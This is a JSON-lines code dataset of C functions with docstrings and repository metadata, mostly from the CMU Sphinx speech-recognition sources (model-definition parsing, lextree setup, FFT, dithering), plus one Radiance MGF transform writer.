{"docstring": "/* same as lookup_word, but adds word if not found */\n", "func_signal": "int add_word(char *s)", "code": "{\n    unsigned short key;\n    char *c;\n    int idx;\n\n    /* convert to uppercase */\n    for(c= s; *c; c++) if( islower((int)*c) ) *c= (char) toupper((int)*c);\n\n    /* use first two chars as hash key */\n    c= (char *) &key;\n    *c = *s;\n    c++;\n    *c = *(s+1);\n\n    idx= key;\n    for( ; idx < MAX_WRDS; idx++) {\n\t/* if unknown word */\n\tif( !wrds[idx] ) {\n    \t    if( (sym_ptr + strlen(s) +1) >= sym_buf_end ) {\n\t\tfprintf(stderr, \"ERROR: overflow SymBufSize %d\\n\", SymBufSize);\n\t\treturn(-1);\n\t    }\n\t    wrds[idx]= sym_ptr;\n\t    strcpy(sym_ptr, s);\n\t    sym_ptr += strlen(s) +1;\n\t    return(idx);\n\t}\n\tif( !strcmp(wrds[idx], s) ) return(idx);\n    }\n    fprintf(stderr, \"ERROR: Unable to add word %s\\n\", s);\n    return(-1);\n}", "path": "logios\\Tools\\MakeGra\\phoenix_v0\\ParserLib\\compile_grammar.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* Parse tmat and state->senone mappings for phone p and fill in structure */\n", "func_signal": "static void\nparse_tmat_senmap(mdef_t * m, const char *line, int32 off, s3pid_t p)", "code": "{\n    int32 wlen, n, s;\n    char word[1024];\n    const char *lp;\n\n    lp = line + off;\n\n    /* Read transition matrix id */\n    if ((sscanf(lp, \"%d%n\", &n, &wlen) != 1) || (n < 0))\n        E_FATAL(\"Missing or bad transition matrix id: %s\\n\", line);\n    m->phone[p].tmat = n;\n    if (m->n_tmat <= n)\n        E_FATAL(\"tmat-id(%d) > #tmat in header(%d): %s\\n\", n, m->n_tmat,\n                line);\n    lp += wlen;\n\n    /* Read senone mappings for each emitting state */\n    for (n = 0; n < m->n_emit_state; n++) {\n        if ((sscanf(lp, \"%d%n\", &s, &wlen) != 1) || (s < 0))\n            E_FATAL(\"Missing or bad state[%d]->senone mapping: %s\\n\", n,\n                    line);\n\n        /*20040821 ARCHAN, This line is added to allow 3.x/3.0 compatability. */\n        m->phone[p].state[n] = s;\n\n        if ((p < m->n_ciphone) && (m->n_ci_sen <= s))\n            E_FATAL(\"CI-senone-id(%d) > #CI-senones(%d): %s\\n\", s,\n                    m->n_ci_sen, line);\n        if (m->n_sen <= s)\n            E_FATAL(\"Senone-id(%d) > #senones(%d): %s\\n\", s, m->n_sen,\n                    line);\n\n        m->sseq[p][n] = s;\n        lp += wlen;\n    }\n\n    /* Check for the last non-emitting state N */\n    if ((sscanf(lp, \"%s%n\", word, &wlen) != 1) || (strcmp(word, \"N\") != 0))\n        E_FATAL(\"Missing non-emitting state spec: %s\\n\", line);\n    lp += wlen;\n\n    /* Check for end of line */\n    if (sscanf(lp, \"%s%n\", word, &wlen) == 1)\n        E_FATAL(\"Non-empty beyond non-emitting final state: %s\\n\", line);\n}", "path": "sphinx3\\src\\libs3decoder\\libam\\mdef.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* RAH 4.19.01, Attempt to free memory that was allocated within this module\n   I have not verified that all the memory has been freed. I've taken only a \n   reasonable effort for now.\n   RAH 4.24.01 - verified that all memory is released.\n */\n", "func_signal": "void\nmdef_free_recursive_lc(ph_lc_t * lc)", "code": "{\n    if (lc == NULL)\n        return;\n\n    if (lc->rclist)\n        mdef_free_recursive_rc(lc->rclist);\n\n    if (lc->next)\n        mdef_free_recursive_lc(lc->next);\n\n    ckd_free((void *) lc);\n}", "path": "sphinx3\\src\\libs3decoder\\libam\\mdef.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* ADDITION FOR CONTINUOUS_TREES */\n", "func_signal": "uint32\nleaf_mean_vars(dtree_node_t *node,\n\t       pset_t *pset,\n\t       float32 ****means,\n\t       float32 ****vars,\n\t       uint32 *node_id,\n\t       uint32 n_state,\n\t       uint32 n_stream,\n\t       uint32 *veclen,\n\t       uint32 off)", "code": "{\n    uint32 i, j, k;\n\n    if (IS_LEAF(node)) {\n\tnode_id[off] = node->node_id;\n\n\tfor (i = 0; i < n_state; i++) {\n\t    for (j = 0; j < n_stream; j++) {\n\t\tfor (k = 0; k < veclen[j]; k++) {\n                    means[off][i][j][k] = node->means[i][j][k];\n                    vars[off][i][j][k] = node->vars[i][j][k];\n\t\t}\n\t    }\n\t}\n\n\treturn ++off;\n    }\n    else {\n\toff = leaf_mean_vars(node->y,\n\t\t\tpset,\n\t\t\tmeans,\n                        vars,\n\t\t\tnode_id,\n\t\t\tn_state,\n\t\t\tn_stream,\n\t\t\tveclen,\n\t\t\toff);\n\toff = leaf_mean_vars(node->n,\n\t\t\tpset,\n\t\t\tmeans,\n                        vars,\n\t\t\tnode_id,\n\t\t\tn_state,\n\t\t\tn_stream,\n\t\t\tveclen,\n\t\t\toff);\n\treturn off;\n    }\n}", "path": "SphinxTrain\\src\\libs\\libcommon\\dtree.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/*\n * A \"twig\" is a node where both children are leaves\n */\n", "func_signal": "uint32\ncnt_twig(dtree_node_t *node)", "code": "{\n    if (IS_LEAF(node)) {\n\treturn 0;\n    } else if (IS_LEAF(node->y) && IS_LEAF(node->n)) {\n\treturn 1;\n    }\n    else {\n\tif (IS_LEAF(node->y) && !IS_LEAF(node->n)) {\n\t    return cnt_twig(node->n);\n\t}\n\telse if (!IS_LEAF(node->y) && IS_LEAF(node->n)) {\n\t    return cnt_twig(node->y);\n\t}\n\telse \n\t    return cnt_twig(node->y) + cnt_twig(node->n);\n    }\n}", "path": "SphinxTrain\\src\\libs\\libcommon\\dtree.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* RAH, added to resolve log3_free */\n", "func_signal": "void kb_init (kb_t *kb)", "code": "{\n    kbcore_t *kbcore;\n    mdef_t *mdef;\n    dict_t *dict;\n    dict2pid_t *d2p;\n    lm_t *lm;\n    s3cipid_t sil, ci;\n    s3wid_t w;\n    int32 i, n, n_lc;\n    wordprob_t *wp;\n    s3cipid_t *lc;\n    bitvec_t lc_active;\n    char *str;\n    \n    /* Initialize the kb structure to zero, just in case */\n    memset(kb, 0, sizeof(*kb));\n\n    kb->kbcore = kbcore_init (cmd_ln_float32 (\"-logbase\"),\n\t\t\t      \"1s_c_d_dd\",    /* Hack!! Hardwired constant \n\t\t\t\t\t\tfor -feat argument */\n\t\t\t      cmd_ln_str(\"-cmn\"),\n\t\t\t      cmd_ln_str(\"-varnorm\"),\n\t\t\t      cmd_ln_str(\"-agc\"),\n\t\t\t      cmd_ln_str(\"-mdef\"),\n\t\t\t      cmd_ln_str(\"-dict\"),\n\t\t\t      cmd_ln_str(\"-fdict\"),\n\t\t\t      \"\",\t/* Hack!! Hardwired constant \n\t\t\t\t\t\tfor -compsep argument */\n\t\t\t      cmd_ln_str(\"-lm\"),\n\t\t\t      cmd_ln_str(\"-fillpen\"),\n\t\t\t      cmd_ln_float32(\"-silprob\"),\n\t\t\t      cmd_ln_float32(\"-fillprob\"),\n\t\t\t      cmd_ln_float32(\"-lw\"),\n\t\t\t      cmd_ln_float32(\"-wip\"),\n\t\t\t      cmd_ln_float32(\"-uw\"),\n\t\t\t      cmd_ln_str(\"-mean\"),\n\t\t\t      cmd_ln_str(\"-var\"),\n\t\t\t      cmd_ln_float32(\"-varfloor\"),\n\t\t\t      cmd_ln_str(\"-mixw\"),\n\t\t\t      cmd_ln_float32(\"-mixwfloor\"),\n\t\t\t      cmd_ln_str(\"-subvq\"),\n\t\t\t      cmd_ln_str(\"-tmat\"),\n\t\t\t      cmd_ln_float32(\"-tmatfloor\"));\n    \n    kbcore = kb->kbcore;\n    \n    mdef = kbcore_mdef(kbcore);\n    dict = kbcore_dict(kbcore);\n    lm = kbcore_lm(kbcore);\n    d2p = kbcore_dict2pid(kbcore);\n    \n    if (NOT_S3WID(dict_startwid(dict)) || NOT_S3WID(dict_finishwid(dict)))\n\tE_FATAL(\"%s or %s not in dictionary\\n\", S3_START_WORD, S3_FINISH_WORD);\n    if (NOT_S3LMWID(lm_startwid(lm)) || NOT_S3LMWID(lm_finishwid(lm)))\n\tE_FATAL(\"%s or %s not in LM\\n\", S3_START_WORD, S3_FINISH_WORD);\n    \n    /* Check that HMM topology restrictions are not violated */\n    if (tmat_chk_1skip (kbcore->tmat) < 0)\n\tE_FATAL(\"Tmat contains arcs skipping more than 1 state\\n\");\n    \n    /*\n     * Unlink <s> and </s> between dictionary and LM, to prevent their \n     * recognition.  They are merely dummy words (anchors) at the beginning \n     * and end of each utterance.\n     */\n    lm_lmwid2dictwid(lm, lm_startwid(lm)) = BAD_S3WID;\n    lm_lmwid2dictwid(lm, lm_finishwid(lm)) = BAD_S3WID;\n    for (w = dict_startwid(dict); IS_S3WID(w); w = dict_nextalt(dict, w))\n\tkbcore->dict2lmwid[w] = BAD_S3LMWID;\n    for (w = dict_finishwid(dict); IS_S3WID(w); w = dict_nextalt(dict, w))\n\tkbcore->dict2lmwid[w] = BAD_S3LMWID;\n    \n    sil = mdef_silphone (kbcore_mdef (kbcore));\n    if (NOT_S3CIPID(sil))\n\tE_FATAL(\"Silence phone '%s' not in mdef\\n\", S3_SILENCE_CIPHONE);\n    \n    E_INFO(\"Building lextrees\\n\");\n    \n    kb->sen_active = (int32 *) ckd_calloc (mdef_n_sen(mdef), sizeof(int32));\n    kb->ssid_active = (int32 *) ckd_calloc (mdef_n_sseq(mdef), sizeof(int32));\n    kb->comssid_active = (int32 *) ckd_calloc (dict2pid_n_comsseq(d2p), \n\t\t\t\t\t\t\tsizeof(int32));\n    /* Build active word list */\n    wp = (wordprob_t *) ckd_calloc (dict_size(dict), sizeof(wordprob_t));\n    n = lm_ug_wordprob (lm, MAX_NEG_INT32, wp);\n    if (n < 1)\n\tE_FATAL(\"%d active words\\n\", n);\n    n = wid_wordprob2alt (dict, wp, n);\t   /* Add alternative pronunciations */\n    \n    /* Retain or remove unigram probs from lextree, depending on option */\n    if (cmd_ln_int32(\"-treeugprob\") == 0) {\n\tfor (i = 0; i < n; i++)\n\t    wp[i].prob = -1;    \t/* Flatten all initial probabilities */\n    }\n    \n    /* Build set of all possible left contexts */\n    lc = (s3cipid_t *) ckd_calloc (mdef_n_ciphone(mdef) + 1, sizeof(s3cipid_t));\n    lc_active = bitvec_alloc (mdef_n_ciphone (mdef));\n    for (w = 0; w < dict_size (dict); w++) {\n\tci = dict_pron (dict, w, dict_pronlen(dict, w) - 1);\n\tif (! mdef_is_fillerphone (mdef, (int)ci))\n\t    bitvec_set (lc_active, ci);\n    }\n    ci = mdef_silphone(mdef);\n    bitvec_set (lc_active, ci);\n    for (ci = 0, n_lc = 0; ci < mdef_n_ciphone(mdef); ci++) {\n\tif (bitvec_is_set (lc_active, ci))\n\t    lc[n_lc++] = ci;\n    }\n    lc[n_lc] = BAD_S3CIPID;\n    \n    /* Create the desired no. of unigram lextrees */\n    kb->n_lextree = cmd_ln_int32 (\"-Nlextree\");\n    if (kb->n_lextree < 1) {\n\tE_ERROR(\"No. of ugtrees specified: %d; will instantiate 1 ugtree\\n\", \n\t\t\t\t\t\t\t\tkb->n_lextree);\n\tkb->n_lextree = 1;\n    }\n    kb->ugtree = (lextree_t **) ckd_calloc (kb->n_lextree, sizeof(lextree_t *));\n    for (i = 0; i < kb->n_lextree; i++) {\n\tkb->ugtree[i] = lextree_build (kbcore, wp, n, lc);\n\tlextree_type (kb->ugtree[i]) = 0;\n    }\n    bitvec_free (lc_active);\n    ckd_free ((void *) lc);\n    \n    /* Create filler lextrees */\n    n = 0;\n    for (i = dict_filler_start(dict); i <= dict_filler_end(dict); i++) {\n\tif (dict_filler_word(dict, i)) {\n\t    wp[n].wid = i;\n\t    wp[n].prob = fillpen (kbcore->fillpen, i);\n\t    n++;\n\t}\n    }\n    kb->fillertree = (lextree_t **)ckd_calloc(kb->n_lextree,sizeof(lextree_t*));\n    for (i = 0; i < kb->n_lextree; i++) {\n\tkb->fillertree[i] = lextree_build (kbcore, wp, n, NULL);\n\tlextree_type (kb->fillertree[i]) = -1;\n    }\n    ckd_free ((void *) wp);\n    \n    E_INFO(\"Lextrees(%d), %d nodes(ug), %d nodes(filler)\\n\",\n\t   kb->n_lextree, lextree_n_node(kb->ugtree[0]), \n\t\t\tlextree_n_node(kb->fillertree[0]));\n    \n    if (cmd_ln_int32(\"-lextreedump\")) {\n\tfor (i = 0; i < kb->n_lextree; i++) {\n\t    fprintf (stderr, \"UGTREE %d\\n\", i);\n\t    lextree_dump (kb->ugtree[i], dict, stderr);\n\t}\n\tfor (i = 0; i < kb->n_lextree; i++) {\n\t    fprintf (stderr, \"FILLERTREE %d\\n\", i);\n\t    lextree_dump (kb->fillertree[i], dict, stderr);\n\t}\n\tfflush (stderr);\n    }\n    \n    kb->ascr = ascr_init (mgau_n_mgau(kbcore_mgau(kbcore)), \n\t\t\t\tkbcore->dict2pid->n_comstate);\n    kb->beam = beam_init (cmd_ln_float64(\"-subvqbeam\"),\n\t\t\t  cmd_ln_float64(\"-beam\"),\n\t\t\t  cmd_ln_float64(\"-pbeam\"),\n\t\t\t  cmd_ln_float64(\"-wbeam\"));\n    E_INFO(\"Beam= %d, PBeam= %d, WBeam= %d, SVQBeam= %d\\n\",\n\t   kb->beam->hmm, kb->beam->ptrans, kb->beam->word, kb->beam->subvq);\n    \n    if ((kb->feat = feat_array_alloc(kbcore_fcb(kbcore),S3_MAX_FRAMES)) == NULL)\n\tE_FATAL(\"feat_array_alloc() failed\\n\");\n    \n    kb->vithist = vithist_init(kbcore, kb->beam->word, cmd_ln_int32(\"-bghist\"));\n    \n    ptmr_init (&(kb->tm_sen));\n    ptmr_init (&(kb->tm_srch));\n    kb->tot_fr = 0;\n    kb->tot_sen_eval = 0.0;\n    kb->tot_gau_eval = 0.0;\n    kb->tot_hmm_eval = 0.0;\n    kb->tot_wd_exit = 0.0;\n    \n    kb->hmm_hist_binsize = cmd_ln_int32(\"-hmmhistbinsize\");\n    n = ((kb->ugtree[0]->n_node) + (kb->fillertree[0]->n_node)) * kb->n_lextree;\n    n /= kb->hmm_hist_binsize;\n    kb->hmm_hist_bins = n+1;\n    kb->hmm_hist = (int32 *) ckd_calloc (n+1, sizeof(int32));\t/* Really no need for +1 */\n    \n    /* Open hypseg file if specified */\n    str = cmd_ln_str(\"-hypseg\");\n    kb->matchsegfp = NULL;\n    if (str) {\n#ifdef WIN32\n\tif ((kb->matchsegfp = fopen(str, \"wt\")) == NULL)\n#else\n\tif ((kb->matchsegfp = fopen(str, \"w\")) == NULL)\n#endif\n\t    E_ERROR(\"fopen(%s,w) failed; use FWDXCT: from std logfile\\n\", str);\n    }\n}", "path": "archive_s3\\s3.3\\src\\libs3decoder\\kb.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* Translated from the FORTRAN (obviously) from \"Real-Valued Fast\n * Fourier Transform Algorithms\" by Henrik V. Sorensen et al., IEEE\n * Transactions on Acoustics, Speech, and Signal Processing, vol. 35,\n * no.6.  Optimized to use a static array of sine/cosines.\n */\n", "func_signal": "int32 fe_fft_real(float64 *x, int n, int m)", "code": "{\n        int32 i, j, k, n1, n2, n4, i1, i2, i3, i4;\n        float64 t1, t2, xt, cc, ss;\n        static float64 *ccc = NULL, *sss = NULL;\n        static int32 lastn = 0;\n\n        if (ccc == NULL || n != lastn) {\n                if (ccc != NULL) {\n                        free(ccc);\n                }\n                if (sss != NULL) {\n                        free(sss);\n                }\n                ccc = calloc(n/4, sizeof(*ccc));\n                sss = calloc(n/4, sizeof(*sss));\n                for (i = 0; i < n/4; ++i) {\n                        float64 a;\n\n                        a = 2*M_PI*i/n;\n                        \n                        ccc[i] = cos(a);\n                        sss[i] = sin(a);\n                }\n                lastn = n;\n        }\n\n        j = 0;\n        n1 = n-1;\n        for (i = 0; i < n1; ++i) {\n                if (i < j) {\n                        xt = x[j];\n                        x[j] = x[i];\n                        x[i] = xt;\n                }\n                k = n/2;\n                while (k <= j) {\n                        j -= k;\n                        k /= 2;\n                }\n                j += k;\n        }\n        for (i = 0; i < n; i += 2) {\n                xt = x[i];\n                x[i] = xt + x[i+1];\n                x[i+1] = xt - x[i+1];\n        }\n        n2 = 0;\n        for (k = 1; k < m; ++k) {\n                n4 = n2;\n                n2 = n4+1;\n                n1 = n2+1;\n                for (i = 0; i < n; i += (1<<n1)) {\n                        xt = x[i];\n                        x[i] = xt + x[i+(1<<n2)];\n                        x[i+(1<<n2)] = xt - x[i+(1<<n2)];\n                        x[i+(1<<n4)+(1<<n2)] = -x[i+(1<<n4)+(1<<n2)];\n                        for (j = 1; j < (1<<n4); ++j) {\n                                i1 = i + j;\n                                i2 = i - j + (1<<n2);\n                                i3 = i + j + (1<<n2);\n                                i4 = i - j + (1<<n1);\n\n                                /* a = 2*M_PI * j / n1; */\n                                /* cc = cos(a); ss = sin(a); */\n                                cc = ccc[j<<(m-n1)];\n                                ss = sss[j<<(m-n1)];\n                                t1 = x[i3] * cc + x[i4] * ss;\n                                t2 = x[i3] * ss - x[i4] * cc;\n                                x[i4] = x[i2] - t2;\n                                x[i3] = -x[i2] - t2;\n                                x[i2] = x[i1] - t1;\n                                x[i1] = x[i1] + t1;\n                        }\n                }\n        }\n        return 0;\n}", "path": "sphinx2\\src\\libsphinx2fe\\fe_sigproc.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/*\n * Initialize phones (ci and triphones) and state->senone mappings from .mdef file.\n */\n", "func_signal": "mdef_t *\nmdef_init(const char *mdeffile, int32 breport)", "code": "{\n    FILE *fp;\n    int32 n_ci, n_tri, n_map, n;\n    char tag[1024], buf[1024];\n    s3senid_t **senmap;\n    /*    s3senid_t *tempsenmap; */\n\n    s3pid_t p;\n    int32 s, ci, cd;\n    mdef_t *m;\n\n    if (!mdeffile)\n        E_FATAL(\"No mdef-file\\n\");\n\n    if (breport)\n        E_INFO(\"Reading model definition: %s\\n\", mdeffile);\n\n    m = (mdef_t *) ckd_calloc(1, sizeof(mdef_t));       /* freed in mdef_free */\n\n    if ((fp = fopen(mdeffile, \"r\")) == NULL)\n        E_FATAL_SYSTEM(\"fopen(%s,r) failed\\n\", mdeffile);\n\n    if (noncomment_line(buf, sizeof(buf), fp) < 0)\n        E_FATAL(\"Empty file: %s\\n\", mdeffile);\n\n    if (strncmp(buf, MODEL_DEF_VERSION, strlen(MODEL_DEF_VERSION)) != 0)\n        E_FATAL(\"Version error: Expecing %s, but read %s\\n\",\n                MODEL_DEF_VERSION, buf);\n\n    /* Read #base phones, #triphones, #senone mappings defined in header */\n    n_ci = -1;\n    n_tri = -1;\n    n_map = -1;\n    m->n_ci_sen = -1;\n    m->n_sen = -1;\n    m->n_tmat = -1;\n    do {\n        if (noncomment_line(buf, sizeof(buf), fp) < 0)\n            E_FATAL(\"Incomplete header\\n\");\n\n        if ((sscanf(buf, \"%d %s\", &n, tag) != 2) || (n < 0))\n            E_FATAL(\"Error in header: %s\\n\", buf);\n\n        if (strcmp(tag, \"n_base\") == 0)\n            n_ci = n;\n        else if (strcmp(tag, \"n_tri\") == 0)\n            n_tri = n;\n        else if (strcmp(tag, \"n_state_map\") == 0)\n            n_map = n;\n        else if (strcmp(tag, \"n_tied_ci_state\") == 0)\n            m->n_ci_sen = n;\n        else if (strcmp(tag, \"n_tied_state\") == 0)\n            m->n_sen = n;\n        else if (strcmp(tag, \"n_tied_tmat\") == 0)\n            m->n_tmat = n;\n        else\n            E_FATAL(\"Unknown header line: %s\\n\", buf);\n    } while ((n_ci < 0) || (n_tri < 0) || (n_map < 0) ||\n             (m->n_ci_sen < 0) || (m->n_sen < 0) || (m->n_tmat < 0));\n\n    if ((n_ci == 0) || (m->n_ci_sen == 0) || (m->n_tmat == 0)\n        || (m->n_ci_sen > m->n_sen))\n        E_FATAL(\"%s: Error in header\\n\", mdeffile);\n\n    /* Check typesize limits */\n    if (n_ci >= MAX_S3CIPID)\n        E_FATAL(\"%s: #CI phones (%d) exceeds limit (%d)\\n\", mdeffile, n_ci,\n                MAX_S3CIPID);\n    if (n_ci + n_tri >= MAX_S3PID)\n        E_FATAL(\"%s: #Phones (%d) exceeds limit (%d)\\n\", mdeffile,\n                n_ci + n_tri, MAX_S3PID);\n    if (m->n_sen >= MAX_S3SENID)\n        E_FATAL(\"%s: #senones (%d) exceeds limit (%d)\\n\", mdeffile,\n                m->n_sen, MAX_S3SENID);\n    if (m->n_tmat >= MAX_S3TMATID)\n        E_FATAL(\"%s: #tmats (%d) exceeds limit (%d)\\n\", mdeffile,\n                m->n_tmat, MAX_S3TMATID);\n\n    m->n_emit_state = (n_map / (n_ci + n_tri)) - 1;\n    if ((m->n_emit_state + 1) * (n_ci + n_tri) != n_map)\n        E_FATAL\n            (\"Header error: n_state_map not a multiple of n_ci*n_tri\\n\");\n\n    /* Initialize ciphone info */\n    m->n_ciphone = n_ci;\n    m->ciphone_ht = hash_table_new(n_ci, 1);  /* With case-insensitive string names *//* freed in mdef_free */\n    m->ciphone = (ciphone_t *) ckd_calloc(n_ci, sizeof(ciphone_t));     /* freed in mdef_free */\n\n    /* Initialize phones info (ciphones + triphones) */\n    m->n_phone = n_ci + n_tri;\n    m->phone = (phone_t *) ckd_calloc(m->n_phone, sizeof(phone_t));     /* freed in mdef_free */\n\n    /* Allocate space for state->senone map for each phone */\n    senmap = (s3senid_t **) ckd_calloc_2d(m->n_phone, m->n_emit_state, sizeof(s3senid_t));      /* freed in mdef_free */\n    m->sseq = senmap;           /* TEMPORARY; until it is compressed into just the unique ones */\n\n\n    /**CODE DUPLICATION!*****************************************************************************************************/\n    /* Flat decoder-specific */\n    /* Allocate space for state->senone map for each phone */\n\n    /* ARCHAN 20040820, this sacrifice readability and may cause pointer\n       problems in future. However, this is a less evil than\n       duplication of code.  This is trick point all the state mapping\n       to the global mapping and avoid duplicated memory.  \n     */\n\n    /* S3 xwdpid_compress will compress the below list phone list. \n     */\n\n    /* ARCHAN, this part should not be used when one of the recognizer is used. */\n    m->st2senmap =\n        (s3senid_t *) ckd_calloc(m->n_phone * m->n_emit_state,\n                                 sizeof(s3senid_t));\n    for (p = 0; p < m->n_phone; p++)\n        m->phone[p].state = m->st2senmap + (p * m->n_emit_state);\n    /******************************************************************************************************/\n\n\n    /* Allocate initial space for <ci,lc,rc,wpos> -> pid mapping */\n    m->wpos_ci_lclist = (ph_lc_t ***) ckd_calloc_2d(N_WORD_POSN, m->n_ciphone, sizeof(ph_lc_t *));      /* freed in mdef_free */\n\n    /*\n     * Read base phones and triphones.  They'll simply be assigned a running sequence\n     * number as their \"phone-id\".  If the phone-id < n_ci, it's a ciphone.\n     */\n\n    /* Read base phones */\n    for (p = 0; p < n_ci; p++) {\n        if (noncomment_line(buf, sizeof(buf), fp) < 0)\n            E_FATAL(\"Premature EOF reading CIphone %d\\n\", p);\n        parse_base_line(m, buf, p);\n    }\n    m->sil = mdef_ciphone_id(m, S3_SILENCE_CIPHONE);\n\n    /* Read triphones, if any */\n    for (; p < m->n_phone; p++) {\n        if (noncomment_line(buf, sizeof(buf), fp) < 0)\n            E_FATAL(\"Premature EOF reading phone %d\\n\", p);\n        parse_tri_line(m, buf, p);\n    }\n\n    if (noncomment_line(buf, sizeof(buf), fp) >= 0)\n        E_ERROR(\"Non-empty file beyond expected #phones (%d)\\n\",\n                m->n_phone);\n\n    /* Build CD senones to CI senones map */\n    if (m->n_ciphone * m->n_emit_state != m->n_ci_sen)\n        E_FATAL\n            (\"#CI-senones(%d) != #CI-phone(%d) x #emitting-states(%d)\\n\",\n             m->n_ci_sen, m->n_ciphone, m->n_emit_state);\n    m->cd2cisen = (s3senid_t *) ckd_calloc(m->n_sen, sizeof(s3senid_t));        /* freed in mdef_free */\n\n    m->sen2cimap = (s3cipid_t *) ckd_calloc(m->n_sen, sizeof(s3cipid_t));       /* freed in mdef_free */\n\n    for (s = 0; s < m->n_sen; s++)\n        m->sen2cimap[s] = BAD_S3CIPID;\n    for (s = 0; s < m->n_ci_sen; s++) { /* CI senones */\n        m->cd2cisen[s] = (s3senid_t) s;\n        m->sen2cimap[s] = s / m->n_emit_state;\n    }\n    for (p = n_ci; p < m->n_phone; p++) {       /* CD senones */\n        for (s = 0; s < m->n_emit_state; s++) {\n            cd = m->sseq[p][s];\n            ci = m->sseq[(int) m->phone[p].ci][s];\n            m->cd2cisen[cd] = (s3senid_t) ci;\n            m->sen2cimap[cd] = m->phone[p].ci;\n        }\n    }\n\n    sseq_compress(m);\n    fclose(fp);\n\n    return m;\n}", "path": "sphinx3\\src\\libs3decoder\\libam\\mdef.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* adds 1/2-bit noise */\n", "func_signal": "int32 fe_dither(int16 *buffer, int32 nsamps)", "code": "{\n  int32 i;\n  for (i=0;i<nsamps;i++)\n    buffer[i] += (short)((!(lrand48()%4))?1:0);\n  \n  return 0;\n}", "path": "sphinx2\\src\\libsphinx2fe\\fe_sigproc.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* RAH, Free memory that was allocated in mdef_init \n   Rational purify shows that no leaks exist\n */\n", "func_signal": "void\nmdef_free(mdef_t * m)", "code": "{\n    int i, j;\n\n    if (m) {\n        if (m->sen2cimap)\n            ckd_free((void *) m->sen2cimap);\n        if (m->cd2cisen)\n            ckd_free((void *) m->cd2cisen);\n\n        /* RAH, go down the ->next list and delete all the pieces */\n        for (i = 0; i < N_WORD_POSN; i++)\n            for (j = 0; j < m->n_ciphone; j++)\n                if (m->wpos_ci_lclist[i][j]) {\n                    mdef_free_recursive_lc(m->wpos_ci_lclist[i][j]->next);\n                    mdef_free_recursive_rc(m->wpos_ci_lclist[i][j]->\n                                           rclist);\n                }\n\n        for (i = 0; i < N_WORD_POSN; i++)\n            for (j = 0; j < m->n_ciphone; j++)\n                if (m->wpos_ci_lclist[i][j])\n                    ckd_free((void *) m->wpos_ci_lclist[i][j]);\n\n\n        if (m->wpos_ci_lclist)\n            ckd_free_2d((void *) m->wpos_ci_lclist);\n        if (m->sseq)\n            ckd_free_2d((void *) m->sseq);\n        /* Free phone context */\n        if (m->phone)\n            ckd_free((void *) m->phone);\n        if (m->ciphone_ht)\n            hash_table_free(m->ciphone_ht);\n\n        for (i = 0; i < m->n_ciphone; i++) {\n            if (m->ciphone[i].name)\n                ckd_free((void *) m->ciphone[i].name);\n        }\n\n\n        if (m->ciphone)\n            ckd_free((void *) m->ciphone);\n\n        if (m->st2senmap)\n            ckd_free((void *) m->st2senmap);\n\n        ckd_free((void *) m);\n    }\n}", "path": "sphinx3\\src\\libs3decoder\\libam\\mdef.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/*\n   Writes a transformation matrix as MGF transform entity\n*/\n", "func_signal": "void write_mgf_transform (FILE *f, Matrix matrix)", "code": "{\n    Vector scale, shear, rotate, transl;\n    float ascale;\n\n    /* Decode the matrix into separate operations */\n    mat_decode (matrix, scale, shear, rotate, transl);\n\n    fprintf (f, \"xf\");\n\t\t\t\t\t\t/* print scaling */\n    if (fabs(scale[X] - 1.0) > 0.001 || fabs(scale[Y] - 1.0) > 0.001 ||\n\t\tfabs(scale[Z] - 1.0) > 0.001) {\n\tif (fabs(scale[X] - scale[Y]) > 0.001 ||\n\t\t\tfabs(scale[Y] - scale[Z]) > 0.001)\n\t    printf(\"Warning: Non-linear scaling in transformation (ignored)\\n\");\n\tascale = sqrt((scale[X]*scale[X] + scale[Y]*scale[Y] +\n\t\t\tscale[Z]*scale[Z])/3.0);\n\tfprintf (f, \" -s %.3f\\n\", ascale);\n    }\n\t\t\t\t\t\t/* add rotation */\n    if (fabs(rotate[X]) > 0.01)\n\tfprintf (f, \" -rx %.2f\", rotate[X]);\n    if (fabs(rotate[Y]) > 0.01)\n\tfprintf (f, \" -ry %.2f\", rotate[Y]);\n    if (fabs(rotate[Z]) > 0.01)\n\tfprintf (f, \" -rz %.2f\", rotate[Z]);\n\t\t\t\t\t\t/* final translation */\n    fprintf (f, \" -t %.4f, %.4f, %.4f\\n\", transl[X], transl[Y], transl[Z]);\n\n    /* Can't handle shear but warn if it's there */\n    if (fabs(shear[X]) > 0.01 || fabs(shear[Y]) > 0.01 || fabs(shear[Z]) > 0.01)\n\tprintf (\"Warning: Significant shear in transformation (ignored)\\n\");\n}", "path": "Reference\\radiance\\src\\cv\\mgflib\\rayopt.c", "repo_name": "dwilliamson/SHTest", "stars": 93, "license": "None", "language": "c", "size": 9791}
